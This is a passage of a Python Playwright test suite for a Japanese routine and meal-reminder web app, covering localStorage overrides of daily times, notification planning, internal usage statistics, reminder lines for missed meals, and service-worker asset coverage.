        page.evaluate("location.hash = '#schedule'")
        page.click("#schedule-days .schedule-day[data-date='2026-11-09'] .routine-skipped")
        self.assertTrue(page.is_visible("#routine-day-reset"))
        page.click("#routine-day-reset")
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.routineOverrides')")), {"2026-11-09": {"wake": "08:30"}})
        # 平日の時刻と同じにしたら、上書きを消す
        page.click(self.routine_row(page, "2026-11-09", "起床"))
        page.fill("#routine-day-time", "07:00")
        page.click("#routine-day-save")
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.routineOverrides')")), {})

    def test_routine_override_changes_voice_plan_and_prunes_old(self):
        init = "localStorage.setItem('db.routineOverrides', JSON.stringify({ '2026-11-09': { lunch: '13:00', dinner: null }, '2026-08-01': { wake: '09:00' } }))"
        page = self.clock_page(10, 0, init_script=init)
        plan = page.evaluate("Voice.plan()")
        self.assertEqual(plan["meal:2026-11-09:lunch"]["at"], int(datetime(2026, 11, 9, 13, 30).timestamp() * 1000))
        self.assertNotIn("meal:2026-11-09:dinner", plan)  # この日はなし
        self.assertEqual(list(json.loads(page.evaluate("localStorage.getItem('db.routineOverrides')"))), ["2026-11-09"])  # 60日より前は消す

    # ---------- 内部の記録（D-060 ⑩） ----------
    def test_stats_counts_missed_skipped_unused_and_notified(self):
        rec = {"2026-11-06": {"wake": {"time": "07:00", "at": 1}, "breakfast": {"skipped": True, "at": 1}},
               "2026-11-07": {}, "2026-11-08": {"lunch": {"time": "12:10", "at": 1}}}
        notify = {"meal:2026-11-09:lunch": {"at": int(datetime(2026, 11, 9, 12, 30).timestamp() * 1000), "body": "x"},
                  "sleep:2026-11-09": {"at": int(datetime(2026, 11, 9, 23, 30).timestamp() * 1000), "body": "y"}}
        init = ("localStorage.setItem('db.records', %s); localStorage.setItem('db.notify', %s);"
                % (json.dumps(json.dumps(rec)), json.dumps(json.dumps(notify))))
        page = self.clock_page(13, 0, init_script=init)
        st = json.loads(page.evaluate("localStorage.getItem('db.stats')"))
        self.assertEqual(st["closedThrough"], "2026-11-08")
        d6 = st["days"]["2026-11-06"]
        self.assertEqual(d6["skipped"], {"breakfast": 1})
        self.assertNotIn("wake", d6["missed"])
        self.assertIn("lunch", d6["missed"])
        self.assertTrue(st["days"]["2026-11-07"]["unused"])  # 記録が1つも無い日は「使わなかった日」
        self.assertNotIn("missed", st["days"]["2026-11-07"])
        self.assertNotIn("lunch", st["days"]["2026-11-08"]["missed"])
        self.assertNotIn("break", st["days"]["2026-11-08"]["missed"])  # 休憩は数えない
        # 声掛けの数：取り消されないまま時刻を過ぎた分（すり合わせのときに数える）
        page.evaluate("localStorage.setItem('phase0.appToken', 'tok')")
        # 画面の route は Service Worker が動き出すと素通りすることがあるので、ブラウザ全体（context）で受ける
        page.context.route(self.WORKER + "/**", lambda r: r.fulfill(status=200, content_type="application/json", headers=self.CORS, body='{"ok":true,"subscribed":true}') if r.request.method != "OPTIONS" else r.fulfill(status=204, headers=self.CORS))
        page.evaluate("Voice.sync()")
        page.wait_for_function("JSON.parse(localStorage.getItem('db.stats')).days['2026-11-09']", timeout=3_000)
        st = json.loads(page.evaluate("localStorage.getItem('db.stats')"))
        self.assertEqual(st["days"]["2026-11-09"]["notified"], {"meal": 1})  # 就寝前はまだ先
        lines = page.evaluate("Stats.weekLines([parseDay('2026-11-06'), parseDay('2026-11-07'), parseDay('2026-11-08'), parseDay('2026-11-09')])")
        self.assertEqual(lines[0], "この週の声掛けの通知：食事1回")
        self.assertIn("昼食1日", lines[1])
        self.assertEqual(lines[2], "アプリを使わなかった日：1日")
        self.assertIsNone(page.query_selector("text=声掛けの通知：食事"))  # 利用者には見せない

    def test_home_line_when_same_meal_missed_three_days(self):
        rec = {d: {"wake": {"time": "07:00", "at": 1}} for d in ("2026-11-06", "2026-11-07", "2026-11-08")}
        init = "if (!localStorage.getItem('db.records')) localStorage.setItem('db.records', %s);" % json.dumps(json.dumps(rec))
        page = self.clock_page(13, 0, init_script=init)
        self.assertEqual(page.text_content("#bubble-text"), "ここ3日、朝の記録がない。食べているなら押しておけ。")  # 最初に当てはまる朝食
        page.reload()
        page.wait_for_function("dialogue !== null")
        self.assertEqual(page.text_content("#bubble-text"), "ここ3日、昼の記録がない。食べているなら押しておけ。")  # 朝食はその日もう出した
        page = self.clock_page(13, 0)  # 3日続いていなければ時間帯の一言
        self.assertIn(page.text_content("#bubble-text"), self.idle_lines("day"))

    def test_sw_assets_all_exist_and_cover_app_files(self):
        sw = (APP_DIR / "sw.js").read_text(encoding="utf-8")
        import re
        assets = re.findall(r"'\./([^']+)'", sw.split("const ASSETS = [", 1)[1].split("];", 1)[0])
        for a in assets:
            self.assertTrue((APP_DIR / a).is_file(), a)  # 1つでも欠けると Service Worker の更新が止まる
        for f in list(APP_DIR.glob("*.js")) + list(APP_DIR.glob("*.html")) + list(APP_DIR.glob("*.css")):
            if f.name != "sw.js":
                self.assertIn(f.name, assets, f.name)


if __name__ == "__main__":
    unittest.main()
